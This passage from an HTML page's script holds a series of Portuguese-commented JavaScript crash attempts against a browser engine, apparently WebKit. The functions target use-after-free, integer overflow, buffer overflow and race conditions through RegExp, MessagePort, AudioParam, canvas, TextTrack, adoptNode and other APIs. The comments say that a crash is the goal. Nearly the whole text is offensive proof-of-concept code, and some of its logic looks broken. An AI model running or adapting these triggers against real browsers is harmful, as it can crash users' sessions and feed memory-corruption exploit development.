                    } catch(e) {}
                }
                
                // O GOLPE: Envia um payload válido gigante para forçar flush + realocação
                // enquanto o estado interno está "sujo".
                const bomb = new Uint8Array(1024 * 1024).fill(0x41); // 1MB
                
                log("Forçando flush crítico...");
                const res = decoder.decode(bomb);
                
                log("Decoder sobreviveu. Output length: " + res.length);
                
            } catch(e) {
                // TypeError ou EncodingError são normais.
                // Crash ou "Internal Error" são sucessos.
                log("Erro Decoder: " + e.message);
            }
        }
function runSortSuicide() {
            log("Iniciando Sort Suicide...");
            
            try {
                // Array grande para garantir que o sort demore e use o Heap
                const arr = new Array(10000).fill(0).map((_, i) => i);
                
                arr.sort((a, b) => {
                    // Gatilho no meio da operação
                    if (a === 5000 || b === 5000) {
                        log("Gatilho! Zerando array...");
                        arr.length = 0; // Esvazia. Memória libertada.
                        // NENHUM PUSH AQUI.
                        
                        // Tenta forçar GC para limpar os restos
                        try { new ArrayBuffer(10 * 1024 * 1024); } catch(e){}
                    }
                    return a - b;
                });
                
                log("Sort terminou.");
                log("Array length: " + arr.length);
                // Se o sort funcionou "corretamente" num array zerado, deve estar vazio.
                // Se houver elementos fantasmas (length > 0 mas vazios), é corrupção.
                if (arr.length > 0) {
                    log("ALERTA: Array Fantasma! Length não é 0.");
                }

            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: RegExp Input Destruction ---
        // Tenta destruir a string de entrada enquanto a Regex a lê.
        function runRegExpDestruction() {
            log("Iniciando RegExp String Destruction...");
            
            try {
                // String gigante para ocupar memória
                let str = "A".repeat(100000);
                const re = /A/g;
                
                // Define um getter em lastIndex para rodar código durante o 'exec'
                Object.defineProperty(re, 'lastIndex', {
                    get: () => { return 0; },
                    set: (v) => {
                        log("Engine definindo lastIndex. Destruindo string...");
                        // Remove a referência à string original
                        str = null;
                        // Aloca lixo para sobrescrever a memória antiga
                        const junk = new Array(100000).fill(1.1);
                        return v;
                    }
                });

                log("Executando regex...");
                // Passamos a string. O motor guarda um ponteiro C++.
                // O nosso setter roda e tenta libertar esse ponteiro.
                re.exec(str);
                
                log("RegExp terminou (Seguro).");
                
            } catch(e) {
                log("Erro RegExp: " + e.message);
            }
        }

        // --- TESTE 3: MessagePort Transfer Race ---
        // Transfere uma porta para si mesma/worker e tenta usá-la simultaneamente.
        function runPortRace() {
            log("Iniciando MessagePort Race...");
            
            try {
                const channel = new MessageChannel();
                const port = channel.port1;
                
                // Objeto que, ao ser serializado, transfere a porta
                const bomb = {
                    get payload() {
                        log("Serializando payload. Transferindo porta...");
                        // Transfere a porta para um novo worker (neutering)
                        const w = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
                        w.postMessage("bye", [port]);
                        return "BOOM";
                    }
                };

                // Tenta enviar a bomba PELA própria porta que vai ser transferida
                // postMessage primeiro serializa (roda o getter), depois envia.
                // Se a ordem interna falhar, ele tenta enviar numa porta fechada/nula.
                port.postMessage(bomb);
                
                log("PostMessage sobreviveu.");
                
            } catch(e) {
                // DataCloneError é a defesa correta.
                // Crash ou erro de sistema é o objetivo.
                log("Erro Port: " + e.message);
            }
        }

    function runPortRace_Aggressive() {
    log("🔥 Iniciando MessagePort Race AGRESSIVA...");

    try {
        const channel = new MessageChannel();
        const port = channel.port1;

        // Criamos dois workers para disputar a mesma porta
        const w1 = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));
        const w2 = new Worker(URL.createObjectURL(new Blob([""], {type:"text/js"})));

        // A cada gatilho, vamos tentar transferir a porta múltiplas vezes
        function multiNeuterPort() {
            try {
                w1.postMessage("x", [port]);
            } catch (e) { log("w1 falhou: " + e.message); }

            try {
                w2.postMessage("x", [port]);
            } catch (e) { log("w2 falhou: " + e.message); }
        }

        // OBJETO BOMBA
        const bomb = {
            get payload() {
                log("💣 Getter ativado: neutering múltiplo!");

                // Disputa simultânea (condição de corrida)
                for (let i = 0; i < 5; i++) {
                    multiNeuterPort();
                }

                return "BOOM";
            },

            get explode() {
                // Getter secundário para piorar o timing
                log("💥 Getter secundário executado durante clone!");
                multiNeuterPort();
                return 1337;
            }
        };

        // Objeto que referencia a si mesmo (stress do structured clone)
        bomb.self = bomb;

        log("📨 Enviando bomba via porta!");
        port.postMessage(bomb);

        log("PostMessage retornou (sem crash).");

    } catch (e) {
        log("Erro capturado: " + e.message);
    }
}
function runAudioParamCrash() {
            log("Iniciando AudioParam Race...");
            
            try {
                const ctx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                
                osc.connect(gain);
                gain.connect(ctx.destination);
                
                // Cria uma curva de automação gigante (Float32Array)
                const size = 1024 * 1024; // 1 Milhão de amostras (4MB)
                const curve = new Float32Array(size).fill(0.5);
                
                // Agenda a automação na thread de áudio
                log("Agendando curva de automação...");
                gain.gain.setValueCurveAtTime(curve, ctx.currentTime, 10);
                osc.start();
                
                // O GOLPE: Rouba o buffer imediatamente
                // A thread de áudio precisa ler 'curve' pelos próximos 10 segundos
                log("Tentando neutrar buffer...");
                try {
                    const w = new Worker(URL.createObjectURL(new Blob([""], {type: "text/javascript"})));
                    // Transfere o buffer (detachment)
                    w.postMessage(curve.buffer, [curve.buffer]);
                    w.terminate();
                    
                    if (curve.length === 0) {
                        log("SUCESSO: Buffer neutrado! Se o áudio continuar/crashar, é UAF.");
                    }
                } catch(e) {
                    log("Falha no detach: " + e.message);
                }

            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 2: Select Options Length UAF ---
        // Manipula a destruição de opções de um select.
        function runSelectUAF() {
            log("Iniciando Select Options Attack...");
            
            const s = document.createElement('select');
            document.body.appendChild(s);
            
            // Adiciona muitas opções
            for(let i=0; i<1000; i++) {
                const o = document.createElement('option');
                o.text = "opt" + i;
                s.add(o);
            }
            
            log("Select preenchido. Truncando...");
            
            // Tenta acessar uma opção enquanto elas estão sendo deletadas em massa
            // length = 0 dispara um loop C++ de destruição
            try {
                // Define um getter na propriedade '0' do HTMLOptionsCollection
                // (Conceitual, nem sempre possível em DOM direto, mas tentamos via colisão)
                const opts = s.options;
                
                // O GOLPE: Zera o tamanho.
                // Imediatamente tenta ler a opção 500 que deveria estar morta
                s.length = 0;
                
                const zombie = opts[500]; 
                if (zombie) {
                    log("ALERTA: Acesso a opção morta possível? " + zombie.text);
                } else {
                    log("Limpeza segura.");
                }
                
            } catch(e) {
                log("Erro Select: " + e.message);
            }
            
            document.body.removeChild(s);
        }

        // --- TESTE 3: CSS Grid Track Overflow ---
        // Força a alocação de milhões de trilhas de grid.
        function runGridCrash() {
            log("Iniciando Grid Memory Smash...");
            const el = document.getElementById('grid-bomb');
            el.style.display = "grid";
            
            // Valor insano: 1 milhão de linhas
            // O WebKit aloca um vetor de estruturas para cada linha
            // sizeof(GridTrack) * 1000000
            const tracks = "repeat(1000000, 10px)";
            
            log("Aplicando estilo de Grid massivo...");
            
            try {
                el.style.gridTemplateRows = tracks;
                
                // Força layout
                const h = el.scrollHeight;
                log("Layout calculado: " + h + "px");
                log("Grid Engine sobreviveu.");
                
            } catch(e) {
                log("Erro Grid: " + e.message);
            }
            
            el.style.display = "none";
        }
function runStringOverflow() {
            log("Iniciando String.repeat Overflow...");
            
            try {
                // 1. Tenta o limite de 32-bit (4GB)
                // Se o sistema usar 32-bit para comprimento, isso vira 0 ou negativo.
                // "A" (1 byte) * (2^32 - 1)
                // Se o alocador calcular errado, aloca pouco e escreve muito.
                
                // Valores críticos:
                // 0xFFFFFFFF (Max Uint32)
                // 0x7FFFFFFF (Max Int32)
                // 0x20000000 (512MB - limite comum de string no V8/JSC antigo)
                
                const counts = [0x7FFFFFFF, 0xFFFFFFF0, 268435455]; 
                
                counts.forEach(c => {
                    try {
                        log(`Tentando repetir string ${c} vezes...`);
                        const s = "A".repeat(c);
                        log(`String criada (Seguro). Length: ${s.length}`);
                    } catch(e) {
                        // RangeError (Invalid string length) é a proteção.
                        // Se crashar, a proteção falhou.
                        log("Erro (Browser Protegeu): " + e.message);
                    }
                });

                // Tentativa secundária: Overflow com string base maior
                // "AAAA" (4 bytes) * 0x40000000 = 4GB
                const base = "AAAA";
                log("Tentando overflow com base maior...");
                const s2 = base.repeat(0x3FFFFFFF); 
                log("Seguro.");

            } catch(e) {
                log("Erro Fatal: " + e.message);
            }
        }

        // --- TESTE 2: Sparse Array Reverse ---
        // Arrays esparsos não têm memória alocada para os "buracos".
        // A função reverse() precisa trocar índices extremos.
        // Se o cálculo de índices falhar em arrays gigantes, pode acessar memória inválida.
        function runSparseReverse() {
            log("Iniciando Sparse Array Reverse...");
            
            try {
                const arr = [];
                // Define índices nos extremos do limite de 32-bit
                arr[0] = 1;
                arr[0xFFFFFFFE] = 2; // 4GB - 2
                
                log(`Array esparso criado. Length: ${arr.length}`);
                log("Executando reverse()...");
                
                // O GOLPE: O motor tem de trocar o índice 0 com o 0xFFFFFFFE.
                // Se ele tentar iterar ou alocar memória para os buracos, OOM.
                // Se ele calcular errado o endereço do último item, Crash.
                arr.reverse();
                
                log("Reverse concluído.");
                log("Valor em [0]: " + arr[0]); // Deve ser 2
                
            } catch(e) {
                log("Erro Sparse: " + e.message);
            }
        }

        // --- TESTE 3: CSS Property Flood ---
        // Enche um elemento com milhares de variáveis CSS únicas.
        // Tenta estourar a tabela de hash interna ou o buffer de estilo.
        function runCSSFlood() {
            log("Iniciando CSS Property Flood...");
            
            const el = document.getElementById('dummy');
            const style = el.style;
            
            try {
                // WebKit tem otimizações para "Inline Styles".
                // Vamos adicionar 50.000 propriedades únicas.
                const count = 50000;
                
                for(let i=0; i<count; i++) {
                    // Usa setProperty para forçar o parser
                    style.setProperty(`--var-${i}`, `val${i}`);
                    
                    if (i % 5000 === 0) log(`Definidas ${i} propriedades...`);
                }
                
                log("Propriedades definidas. Forçando acesso...");
                
                // Tenta ler uma propriedade para forçar a resolução do mapa
                const val = getComputedStyle(el).getPropertyValue(`--var-${count-1}`);
                log("Leitura: " + val);
                
                // O GOLPE: Tenta aplicar esse estilo massivo a outro elemento (Clone)
                // Isso força uma cópia da estrutura interna gigante
                const clone = el.cloneNode(true);
                document.body.appendChild(clone);
                
                log("Clone e renderização concluídos (Seguro).");
                document.body.removeChild(clone);
                
            } catch(e) {
                log("Erro CSS: " + e.message);
            }
        }
 function runLocaleCompareCrash() {
            log("Iniciando Locale Compare Stack Attack...");
            
            try {
                // Cria strings gigantes para forçar alocação na stack do C
                // 1MB de dados repetidos
                const strA = "A".repeat(1024 * 1024);
                const strB = "B".repeat(1024 * 1024);
                
                log(`Comparando strings de ${strA.length} bytes...`);
                
                // Usa um locale complexo para ativar lógica de transformação pesada
                // 'co-phonebk' (lista telefónica) exige ordenação especial
                const result = strA.localeCompare(strB, "de-DE-u-co-phonebk", {
                    usage: "sort",
                    sensitivity: "variant"
                });
                
                log("Comparação terminou (Seguro). Resultado: " + result);
                
            } catch(e) {
                // Se for RangeError, o JS protegeu.
                // Se o navegador fechar, a libc falhou.
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 2: Date Format Buffer Overflow ---
        // Ataca 'strftime' / 'asctime_s'.
        // Gera uma data que resulta numa string maior que os buffers padrão de C (ex: 256 bytes).
        function runDateFormatCrash() {
            log("Iniciando Date Format Buffer Overflow...");
            
            try {
                // Data com ano gigante e timezone longo
                const d = new Date();
                d.setFullYear(200000); // Ano enorme
                
                log("Formatando data extrema...");
                
                // Pede formato completo para maximizar o tamanho da string
                const options = {
                    weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
                    hour: 'numeric', minute: 'numeric', second: 'numeric',
                    timeZoneName: 'long', era: 'long'
                };
                
                // Tenta forçar o uso de um locale que expande o texto (ex: Arábico ou Chinês)
                const fmt = new Intl.DateTimeFormat("ar-SA", options);
                
                // O GOLPE: O C++ aloca um buffer (ex: 128 bytes).
                // A string resultante (com ano 200000 em arábico e timezone) pode exceder isso.
                const res = fmt.format(d);
                
                log("Formatação terminou (Seguro). Len: " + res.length);
                log("Output parcial: " + res.substring(0, 50) + "...");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: RegExp Execution State Desync ---
        // Tenta corromper o estado interno do motor RegExp durante a execução.
        function runRegExpStateCrash() {
            log("Iniciando RegExp State Desync...");
            
            try {
                const re = /A/g;
                // String alvo
                let str = "A".repeat(10000);
                
                // Define um getter em lastIndex que roda a cada match
                Object.defineProperty(re, 'lastIndex', {
                    get: function() { return 0; },
                    set: function(v) {
                        // O GOLPE: O motor C++ está no meio do loop.
                        // Nós tentamos invalidar a string ou o próprio RegExp aqui.
                        log("Engine definindo lastIndex. Corrompendo estado...");
                        
                        // Tenta forçar GC agressivo para limpar a string original
                        str = null; 
                        const junk = new Array(10000).fill(1.1);
                        
                        return v;
                    }
                });

                log("Executando RegExp.exec...");
                // Se o motor C++ manteve um ponteiro para 'str' sem proteger contra GC,
                // ele vai ler memória liberta na próxima iteração.
                re.exec(str);
                
                log("RegExp terminou (Seguro).");
                
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
function runGCResurrection() {
            log("Iniciando GC Resurrection Attack...");
            
            if (!window.FinalizationRegistry) {
                log("API FinalizationRegistry não suportada.");
                return;
            }

            let registry = new FinalizationRegistry(heldValue => {
                // Este código roda quando o objeto morre.
                // O GC está num estado sensível aqui.
                log("Objeto coletado! Tentando alocação massiva no callback...");
                
                // Tenta forçar movimento de memória enquanto o GC limpa
                const chaos = [];
                try {
                    for(let i=0; i<1000; i++) chaos.push(new ArrayBuffer(1024 * 100));
                } catch(e) {}
                
                // Se o GC não estiver bloqueado corretamente, isso pode corromper o heap.
            });

            // Cria objetos descartáveis
            function makeTrash() {
                let obj = { id: Math.random() };
                registry.register(obj, "LIXO");
                obj = null; // Marca para coleta
            }

            // Gera lixo massivo para forçar o ciclo de GC
            log("Gerando pressão de GC...");
            const interval = setInterval(() => {
                for(let i=0; i<1000; i++) makeTrash();
                
                // Tenta forçar alocação para disparar o GC
                const trigger = new Array(10000).fill(1.1);
            }, 10);

            setTimeout(() => {
                clearInterval(interval);
                log("Teste GC finalizado.");
            }, 5000);
        }

        // --- TESTE 2: Canvas Save() Stack Exhaustion ---
        // Tenta estourar a pilha de estados interna do Canvas (C++).
        function runCanvasStack() {
            log("Iniciando Canvas Stack Smash...");
            
            const ctx = document.getElementById('c').getContext('2d');
            let depth = 0;
            
            try {
                // Loop infinito de save()
                // Cada save aloca memória para guardar o estado atual (matrix, style, clip)
                while (true) {
                    depth++;
                    ctx.fillStyle = "red";
                    ctx.shadowBlur = 10; // Adiciona complexidade ao estado
                    ctx.save();
                    
                    if (depth % 10000 === 0) log(`Stack depth: ${depth}`);
                    
                    if (depth > 500000) break; // Limite de segurança do script
                }
                log("Canvas Stack sobreviveu a " + depth + " níveis.");
                
            } catch(e) {
                log("Erro Canvas (Limite atingido?): " + e.message);
            }
        }

        // --- TESTE 3: Node.replaceChild Reentrancy ---
        // Usa um getter ou proxy para reentrar no DOM durante uma substituição.
        function runReplaceReentrancy() {
            log("Armando replaceChild Reentrancy Trap...");
            
            const sandbox = document.getElementById('sandbox');
            sandbox.innerHTML = "<div>ALVO</div>";
            const parent = sandbox.firstChild;
            const oldChild = parent.firstChild;
            
            // Cria um novo nó que dispara código ao ser inserido?
            // Usamos um DocumentFragment com um script que roda imediatamente
            const newChild = document.createDocumentFragment();
            const s = document.createElement('script');
            s.textContent = `
                parent.log("Script injetado executando!");
                // O GOLPE: Remove o pai ('parent') do DOM agora mesmo
                const p = document.getElementById('sandbox').firstChild;
                if (p) p.parentNode.removeChild(p);
                // Tenta destruir o 'oldChild' também
            `;
            newChild.appendChild(s);

            try {
                log("Executando parent.replaceChild()...");
                // O C++ remove oldChild, prepara newChild...
                // Ao inserir newChild, o script roda.
                // O script remove 'parent'.
                // O C++ tenta finalizar a operação no 'parent' morto?
                parent.replaceChild(newChild, oldChild);
                
                log("Operação DOM finalizada.");
                
            } catch(e) {
                log("Erro DOM: " + e.message);
            }
        }
function runUnshiftOverflow() {
            log("Iniciando Unshift Overflow...");
            
            try {
                // Cria um array esparso gigante (length = 2^32 - 5)
                const arr = [];
                arr.length = 0xFFFFFFFF - 5; 
                
                log(`Array base criado. Length: ${arr.length}`);
                log("Executando unshift(10 itens)...");
                
                // Se o motor somar o tamanho atual com os novos itens sem checar overflow de 32-bit:
                // (2^32 - 5) + 10 = 5 (Overflow)
                // Ele pode alocar um buffer para 5 itens e tentar mover os 4GB de dados virtuais.
                arr.unshift(1, 2, 3, 4, 5, 6, 7, 8, 9, 10);
                
                log("Unshift terminou. Length final: " + arr.length);
                
            } catch(e) {
                // RangeError é a proteção correta.
                // Crash ou OOM é o objetivo.
                log("Erro (Browser Protegeu): " + e.message);
            }
        }

        // --- TESTE 2: Intl.Collator Infinite Recursion ---
        // Tenta estourar a stack nativa da libc via comparação recursiva.
        function runCollatorRecursion() {
            log("Iniciando Collator Recursion...");
            
            const collator = new Intl.Collator();
            
            const evil = {
                toString: function() {
                    // Recursão infinita dentro da chamada nativa
                    return this.toString(); 
                }
            };

            try {
                log("Comparando objeto recursivo...");
                // O C++ chama toString -> JS chama toString -> ...
                // Se o limite de pilha JS não for verificado dentro do callback do C++, BOOM.
                collator.compare(evil, "a");
                
            } catch(e) {
                log("Erro (Stack Overflow capturado): " + e.message);
            }
        }

        // --- TESTE 3: MessagePort Self-Transfer Loop ---
        // Envia uma porta para si mesma repetidamente para estressar o kernel IPC.
        function runPortConfusion() {
            log("Iniciando Port Confusion...");
            
            try {
                const channel = new MessageChannel();
                let port = channel.port1;
                const port2 = channel.port2;
                
                port2.onmessage = (e) => {
                    // Recebe a porta e envia de volta imediatamente
                    const p = e.data;
                    // Tenta criar um loop fechado de transferência
                    p.postMessage(p, [p]);
                };

                log("Iniciando loop de transferência...");
                // Envia a porta para o outro lado
                port.postMessage(port, [port]);
                
                // Tenta interagir com a porta "neutered"
                setTimeout(() => {
                    try {
                        port.close();
                        log("Porta fechada (se não crashou).");
                    } catch(e) { log("Porta inacessível: " + e.message); }
                }, 1000);

            } catch(e) {
                log("Erro Port: " + e.message);
            }
        }

function runXHRTypeConfusion() {
            log("Iniciando XHR Type Confusion...");
            
            try {
                const xhr = new XMLHttpRequest();
                // Usa a própria página como fonte de dados (garante que existe e carrega rápido)
                xhr.open("GET", window.location.href + "?" + Math.random());
                
                let toggles = 0;
                
                xhr.onprogress = function() {
                    // O GOLPE: Muda o tipo de resposta violentamente durante o download.
                    // O C++ pode ter alocado um buffer de String e agora tem de lidar com ArrayBuffer.
                    try {
                        toggles++;
                        if (toggles % 2 === 0) {
                            xhr.responseType = "text";
                        } else {
                            xhr.responseType = "arraybuffer";
                        }
                        
                        // Tenta acessar a resposta parcial para forçar processamento
                        const junk = xhr.response;
                    } catch(e) {}
                };

                xhr.onload = function() {
                    log("Download concluído. Verificando integridade...");
                    try {
                        // Se a memória estiver corrompida, o acesso final pode crashar
                        const res = xhr.response;
                        log("Tipo final: " + typeof res);
                    } catch(e) { log("Erro de acesso: " + e.message); }
                };

                xhr.send();
                log("Requisição enviada. Mudando tipos...");

            } catch(e) {
                log("Erro XHR: " + e.message);
            }
        }

        // --- TESTE 2: TextTrack Cue Iterator UAF ---
        // Cria legendas e remove a faixa inteira quando a primeira legenda é ativada.
        function runTrackRace() {
            log("Iniciando TextTrack Iterator UAF...");
            
            const video = document.createElement('video');
            // Adiciona uma faixa de legendas
            const track = video.addTextTrack("subtitles", "Crash", "en");
            track.mode = "showing";
            
            // Adiciona muitas cues para encher a lista
            for(let i=0; i<100; i++) {
                // Cues de 0.1 segundos
                const cue = new VTTCue(i*0.1, (i+1)*0.1, "Text " + i);
                
                cue.onenter = function() {
                    log("Cue " + i + " ativa. Destruindo Track...");
                    
                    // O GOLPE: Removemos a referência à track ou limpamos as cues.
                    // O iterador C++ ainda está a percorrer a lista de cues para ver quem mais deve ativar.
                    try {
                        // Opção 1: Tenta limpar a lista de cues
                        while(track.cues.length > 0) track.removeCue(track.cues[0]);
                        
                        // Opção 2: Tenta mudar o modo para desativar o processamento
                        track.mode = "disabled";
                        
                        // Opção 3: Destrói o vídeo
                        video.src = "";
                        
                        // Aloca lixo para ocupar a memória libertada
                        const junk = new Array(1000).fill(1.1);
                    } catch(e) {}
                };
                
                track.addCue(cue);
            }
            
            // Inicia um "playback" falso acelerando o tempo
            // Não precisa de vídeo real, basta avançar o relógio das legendas
            log("Avançando tempo...");
            let time = 0;
            const interval = setInterval(() => {
                time += 0.05;
                // Simula avanço de tempo que dispara os eventos 'onenter'
                // Nota: Em um ambiente real, o video.currentTime faria isso,
                // mas sem source válida, tentamos forçar eventos manualmente se possível
                // ou confiar que o 'addCue' inicialize estados.
                // Para garantir, tentamos um blob vazio como vídeo.
            }, 10);
            
            // Setup de vídeo real mínimo
            video.src = URL.createObjectURL(new Blob([""], {type:"video/mp4"}));
            video.play().catch(e => log("Playback iniciado (pode falhar sem codec, mas ativa a track)."));
            
            setTimeout(() => clearInterval(interval), 2000);
        }

        // --- TESTE 3: AdoptNode Owner Mismatch ---
        // Move nós entre documentos enquanto os modifica.
        function runAdoptCrash() {
            log("Iniciando AdoptNode Crash...");
            
            const ifr = document.getElementById('ifr');
            const otherDoc = ifr.contentDocument;
            
            // Cria um nó complexo no outro documento
            const target = otherDoc.createElement('div');
            target.innerHTML = "<b>Move me</b>";
            otherDoc.body.appendChild(target);
            
            try {
                // Prepara um observador ou getter que roda durante a adoção?
                // WebKit dispara eventos de mutação.
                
                log("Adotando nó do iframe...");
                
                // O GOLPE: O adoptNode muda o 'ownerDocument'.
                // Se conseguirmos aceder ao nó no meio do processo e tentar usá-lo
                // num contexto onde ele ainda acha que pertence ao iframe (que pode ser fechado), crash.
                
                const adopted = document.adoptNode(target);
                
                // Imediatamente remove o iframe (mata o documento original)
                document.body.removeChild(ifr);
                
                // Tenta usar o nó adotado que pode ter referências internas quebradas
                document.body.appendChild(adopted);
                adopted.innerHTML = "Survivors";
                
                log("Adoção concluída (Seguro).");
                
                // Restaura o iframe para o próximo teste
                const newIfr = document.createElement('iframe');
                newIfr.id = 'ifr';
                newIfr.style.display = 'none';
                document.body.appendChild(newIfr);
                
            } catch(e) {
                log("Erro Adopt: " + e.message);
            }
        }
function runCanvasOverflow() {
            log("Iniciando Canvas Math Attack...");
            
            const canvas = document.getElementById('c');
            const ctx = canvas.getContext('2d');
            
            // Dimensões que, multiplicadas, podem causar overflow em 32-bit
            // 65536 * 65536 = 4,294,967,296 (0 em 32-bit)
            const dimensions = [
                { w: 65536, h: 65536 }, 
                { w: 32768, h: 32768 },
                { w: 100000, h: 100000 }
            ];

            dimensions.forEach((dim, i) => {
                setTimeout(() => {
                    try {
                        log(`Tentativa ${i}: ${dim.w}x${dim.h}...`);
                        
                        // O GOLPE: Pedir os dados de uma área impossível.
                        // Se o cálculo de tamanho falhar, ele aloca pouco.
                        // Mas a leitura tenta ler GBs de memória.
                        const data = ctx.getImageData(0, 0, dim.w, dim.h);
                        
                        log("ALERTA: Buffer alocado! Tamanho reportado: " + data.data.length);
                        
                        // Tenta acessar o fim do buffer para forçar Page Fault se for inválido
                        const lastByte = data.data[data.data.length - 1];
                        
                    } catch(e) {
                        // Erro "IndexSizeError" ou "Out of memory" é normal.
                        // Crash é o objetivo.
                    }
                }, i * 500);
            });
        }

        // --- TESTE 2: CSS ::first-letter Layout UAF ---
        // Manipula o DOM violentamente enquanto o motor renderiza o pseudo-elemento.
        function runFirstLetterUAF() {
            log("Iniciando First-Letter Renderer Stress...");
            const target = document.getElementById('first-letter-box');
            
            let count = 0;
            const interval = setInterval(() => {
                count++;
                if (count > 100) {
                    clearInterval(interval);
                    log("Teste de Layout finalizado.");
                    return;
                }

                try {
                    // 1. Altera o texto (destrói o RenderObject antigo)
                    target.innerText = "A" + Math.random();
                    
                    // 2. Força layout parcial
                    const h = target.offsetHeight;
                    
                    // 3. Insere elemento que quebra a estrutura do ::first-letter
                    const span = document.createElement('span');
                    span.innerText = "B";
                    target.insertBefore(span, target.firstChild);
                    
                    // 4. Remove imediatamente
                    target.removeChild(span);
                    
                    // 5. Altera estilo para forçar reconstrução
                    target.style.color = (count % 2 === 0) ? "blue" : "green";
                    
                } catch(e) {
                    log("Erro DOM: " + e.message);
                }
            }, 10); // Loop rápido para acertar a race condition do renderizador
        }

        // --- TESTE 3: Video Error Event UAF ---
        // Cria um vídeo inválido e destrói o elemento durante o evento de erro.
        function runVideoErrorUAF() {
            log("Iniciando Video Error UAF...");
            
            const v = document.createElement('video');
            v.style.display = 'none';
            document.body.appendChild(v);
            
            v.onerror = function() {
                log("Evento 'error' disparado. Destruindo vídeo...");
                
                // O GOLPE: Remove o vídeo do DOM.
                // O motor de mídia pode tentar acessar propriedades do vídeo
                // para reportar detalhes do erro após este callback.
                try {
                    document.body.removeChild(v);
                    
                    // Tenta forçar GC para limpar o objeto C++
                    const junk = [];
                    for(let i=0; i<1000; i++) junk.push(new ArrayBuffer(10240));
                    
                    // Nulifica a referência JS
                    // v = null; // (Não funciona bem dentro do handler, mas a ideia é essa)
                    
                } catch(e) {}
            };

            // Define uma fonte inválida para disparar o erro imediatamente
            v.src = "http://invalid.local/" + Math.random();
            
            log("Fonte definida. Aguardando crash...");
        }
   

    </script>
</body>
</html>
